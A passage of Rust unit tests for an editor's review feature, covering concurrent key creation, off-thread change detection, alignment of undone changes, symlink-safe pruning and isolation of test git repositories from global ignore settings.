    assert_eq!(std::fs::read(&lone).unwrap(), [1; 32], "never overwritten");
    let at_once = std::sync::Arc::new(std::sync::Barrier::new(8));
    let threads: Vec<_> = (0..8)
        .map(|_| {
            let (at_once, rec) = (at_once.clone(), rec.clone());
            std::thread::spawn(move || {
                at_once.wait();
                key(&rec).unwrap()
            })
        })
        .collect();
    let keys: Vec<[u8; 32]> = threads.into_iter().map(|t| t.join().unwrap()).collect();
    assert!(keys.iter().all(|k| *k == keys[0]), "one key");
    assert_eq!(std::fs::read(key_path(&rec)).unwrap(), keys[0], "the one kept");
    std::fs::remove_dir_all(&dir).ok();
}

/// A file's changes are found on a worker, never in a frame: the thread that draws found none itself, and they
/// were found.
#[test]
fn a_frame_finds_no_changes_itself() {
    let (mut ed, dir) = reviewing("off-frame", &["a.txt", "b.txt"], &[]);
    show(&mut ed, &dir, 1, "b.txt");
    assert_eq!(FOUND_HERE.with(|n| n.get()), 0, "found in a frame");
    assert_eq!(ed.session.reviews.code.as_ref().map(|w| w.kept().count()), Some(2), "found on a worker");
    std::fs::remove_dir_all(&dir).ok();
}

/// A change taken back pairs with an alike one found only where it was (`u`): one alike made elsewhere since is
/// new, never the one taken back come again.
#[test]
fn a_change_taken_back_comes_back_only_where_it_was() {
    let gone = |at| Followed { at, leave: 0, gone: true };
    let there = |at| Followed { at, leave: 2, gone: false };
    assert_eq!(align(&[gone(5), there(50)], &[50, 80]), [(1, 0)], "80 is new");
    assert_eq!(align(&[gone(5), there(50)], &[5, 50]), [(0, 0), (1, 1)], "5 is it, back");
}

/// Pruning at start refuses a link at the record's folder: no month removed where it points.
#[test]
fn pruning_refuses_a_link_at_the_records_folder() {
    let dir = crate::scratch::Scratch::new("reviews-prune-link").into_path();
    let elsewhere = dir.join("elsewhere");
    std::fs::create_dir(&elsewhere).unwrap();
    std::fs::write(elsewhere.join("2020-01.jsonl"), "{}\n").unwrap();
    std::os::unix::fs::symlink(&elsewhere, dir.join(DIR)).unwrap();
    assert!(prune(&dir.join(DIR), std::time::SystemTime::now()).is_err(), "refused");
    assert!(elsewhere.join("2020-01.jsonl").exists(), "nothing pruned through it");
    std::fs::remove_dir_all(&dir).ok();
}

/// N10: the tests' repositories are made reading no global ignore, not even from its default place — a stand-in
/// home whose `~/.config/git/ignore` lists `.env` leaves it committed.
#[test]
fn the_tests_git_reads_no_global_ignore() {
    let (_, dir) = repo("xdg", &[("a.txt", "a\n", "a\n")], &[]);
    let home = dir.join("home");
    std::fs::create_dir_all(home.join(".config/git")).unwrap();
    std::fs::write(home.join(".config/git/ignore"), ".env\n").unwrap();
    let out = test_git(&dir).env("HOME", &home).args(["check-ignore", "-q", ".env"]).output().unwrap();
    assert_eq!(out.status.code(), Some(1), "not ignored: {}", String::from_utf8_lossy(&out.stderr));
    std::fs::remove_dir_all(&dir).ok();
}
